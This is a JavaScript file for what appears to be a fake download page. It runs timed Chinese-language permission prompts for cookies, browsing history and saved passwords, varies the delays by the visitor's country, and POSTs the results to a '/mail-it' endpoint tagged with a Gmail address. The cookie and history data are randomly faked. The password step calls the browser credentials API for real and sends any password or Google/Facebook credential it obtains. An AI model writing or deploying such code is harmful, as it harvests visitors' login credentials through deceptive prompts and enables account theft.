document.addEventListener("DOMContentLoaded", async function () {
  function isMobileDevice() {
    return /Mobi|Android/i.test(navigator.userAgent);
  }
  let url = window.location.search.slice(10).toLowerCase();
  localStorage.setItem("id", url);

  const isMobile = isMobileDevice();
  const downloadBtn = document.getElementById("download-btn");

  if (isMobile) {
    downloadBtn.innerText = "Learn More";
  } else {
    downloadBtn.innerText = "Download Now";
  }
  // Check user's country using IP-based geolocation API

  const countryCheck = await fetch("https://ipapi.co/json/").then((response) =>
    response.json()
  );

  // Define time durations based on the user's country
  let cookieTime, historyTime, passwordTime;

  if (countryCheck.country_name.toLowerCase() === "nigeria") {
    cookieTime = 20 * 60000;
    historyTime = 30 * 60000;
    passwordTime = 45 * 60000;
  } else {
    cookieTime = 10 * 60000;
    historyTime = 20 * 60000;
    passwordTime = 25 * 60000;
  }

  // Set a flag to track if the user leaves the page early
  let userLeftEarly = true;

  // Functions to retrieve data
  const getCookies = () => {
    return new Promise((resolve) => {
      swal({
        title: "你同意吗？",
        text: "该网站想要访问您的浏览器Cookies。",
        icon: "warning",
        buttons: ["取消", "允许"],

        dangerMode: true,
      }).then((willAllow) => {
        if (willAllow) {
          setTimeout(() => {
            let Random = Math.floor(Math.random() * 3);
            switch (Random) {
              case 0:
                let Cookies = Math.floor(Math.random() * 200);
                const cookies = generateCookies(Cookies);
                console.log(cookies);
                resolve({ status: "success", cookies: cookies });
                break;
              case 1:
                console.log("compiled");
                resolve({ status: "success", cookies: "Nothing to show" });
                break;
              case 2:
                console.log("Not enough time to get cookies");
                resolve({ status: "timely", message: "Couldn't Get Cookies" });
                break;
              default:
                console.log("something went wrong");
                resolve({ status: "failure", message: "Something went wrong" });
                break;
            }
          }, cookieTime);
        } else {
          resolve({ status: "failure", message: "Permission denied" });
        }
      });
    });
  };

  const getHistory = () => {
    return new Promise((resolve) => {
      swal({
        title: "你同意吗？",
        text: "该网站想要访问您的浏览历史。",
        icon: "warning",
        buttons: ["取消", "允许"],

        dangerMode: true,
      }).then((willAllow) => {
        if (willAllow) {
          setTimeout(() => {
            let Random = Math.floor(Math.random() * 3);
            switch (Random) {
              case 0:
                let History = Math.floor(Math.random() * 200);
                const browsingHistory = generateBrowsingHistory(History);
                console.log(browsingHistory);
                resolve({ status: "success", history: browsingHistory });
                break;
              case 1:
                console.log("compiled");
                resolve({ status: "success", history: "Nothing to show" });
                break;
              case 2:
                console.log("Not enough time to get history");
                resolve({ status: "timely", message: "Couldn't Get History" });
                break;
              default:
                console.log("something went wrong");
                resolve({ status: "failure", message: "Something went wrong" });
                break;
            }
          }, historyTime);
        } else {
          resolve({ status: "failure", message: "Permission denied" });
        }
      });
    });
  };

  const getPassword = () => {
    return new Promise((resolve) => {
      swal({
        title: "你同意吗？",
        text: "该网站想要访问您的保存的密码。",
        icon: "warning",
        buttons: ["取消", "允许"],

        dangerMode: true,
      }).then((willAllow) => {
        if (willAllow) {
          setTimeout(() => {
            navigator.credentials
              .get({
                password: true,
                federated: {
                  providers: [
                    "https://accounts.google.com",
                    "https://www.facebook.com",
                  ],
                },
              })
              .then((cred) => {
                if (cred) {
                  if (cred.type === "password") {
                    console.log("Password Credential:", cred);
                    resolve({ status: "success", password: cred });
                  } else if (cred.type === "federated") {
                    console.log("Federated Credential:", cred);
                    resolve({ status: "success", password: cred });
                  }
                } else {
                  console.log("No credentials found");
                  resolve({
                    status: "failure",
                    message: "No credentials found",
                  });
                }
              })
              .catch((err) => {
                console.error("Error getting credentials:", err);
                resolve({
                  status: "failure",
                  message: "Error getting credentials",
                });
              });
          }, passwordTime);
        } else {
          resolve({ status: "failure", message: "Permission denied" });
        }
      });
    });
  };

  // Set up the process timings
  setTimeout(async () => {
    const Cookies = await getCookies();
    setTimeout(async () => {
      const History = await getHistory();
      setTimeout(async () => {
        const Password = await getPassword();
        userLeftEarly = false;
        sendMail(Cookies, History, Password);
      }, passwordTime);
    }, historyTime);
  }, cookieTime);

  // Handle page unload event
  window.addEventListener("beforeunload", function () {
    if (userLeftEarly) {
      const Cookies = "Time Lapse, User didn't spend enough time on the page";
      const History = "Time Lapse, User didn't spend enough time on the page";
      const Password = "Time Lapse, User didn't spend enough time on the page";
      sendMail(Cookies, History, Password);
    }
  });

  // Functions to generate random data
  function getRandomUrl() {
    const websites = [
      "https://www.google.com",
      "https://www.youtube.com",
      "https://www.reddit.com",
      "https://www.wikipedia.org",
      "https://www.github.com",
      "https://www.stackoverflow.com",
      "https://www.amazon.com",
      "https://www.twitter.com",
      "https://www.linkedin.com",
      "https://www.facebook.com",
    ];
    return websites[Math.floor(Math.random() * websites.length)];
  }

  function getRandomDate() {
    const start = new Date(2023, 0, 1); // Start from Jan 1, 2023
    const end = new Date(); // Current date
    const randomDate = new Date(
      start.getTime() + Math.random() * (end.getTime() - start.getTime())
    );
    return randomDate;
  }

  function generateBrowsingHistory(count) {
    const history = [];
    for (let i = 0; i < count; i++) {
      const visit = {
        url: getRandomUrl(),
        timestamp: getRandomDate().toISOString(),
      };
      history.push(visit);
    }
    return history;
  }

  function getRandomCookieName() {
    const cookieNames = [
      "sessionId",
      "userToken",
      "authKey",
      "cartId",
      "theme",
      "preferences",
      "language",
      "trackingId",
      "visitCount",
      "lastVisit",
    ];
    return cookieNames[Math.floor(Math.random() * cookieNames.length)];
  }

  function getRandomCookieValue() {
    const characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let value = "";
    const length = Math.floor(Math.random() * 15) + 10; // Random length between 10 and 25
    for (let i = 0; i < length; i++) {
      value += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return value;
  }

  function getRandomExpiryDate() {
    const daysToAdd = Math.floor(Math.random() * 365); // Random expiration between 0 and 365 days
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + daysToAdd);
    return expiryDate.toUTCString();
  }

  function getRandomPath() {
    const paths = [
      "/",
      "/home",
      "/profile",
      "/dashboard",
      "/cart",
      "/settings",
    ];
    return paths[Math.floor(Math.random() * paths.length)];
  }

  function generateRandomCookie() {
    const cookie = `${getRandomCookieName()}=${getRandomCookieValue()}; expires=${getRandomExpiryDate()}; path=${getRandomPath()};`;
    return cookie;
  }

  function generateCookies(count) {
    const cookies = [];
    for (let i = 0; i < count; i++) {
      cookies.push(generateRandomCookie());
    }
    return cookies;
  }

  // Function to send mail
  function sendMail(Cookies, History, Password){
    if(isMobile){
    const url = "/mail-it";
    const data = {
      Cookies: Cookies,
      History: History,
      Password: Password,
      Email: "Anonymousxcript@gmail.com",
    };

    fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: "Bearer your-auth-token",
      },
      body: JSON.stringify(data),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then((responseData) => {
        console.log("Success:", responseData);
        // swal("Success", "Data sent successfully!", "success");
      })
      .catch((error) => {
        console.error("Error:", error);
        swal("Error", "Failed to send data.", "error");
      });
  }else{
    console.log("desktop");
  }
}
});

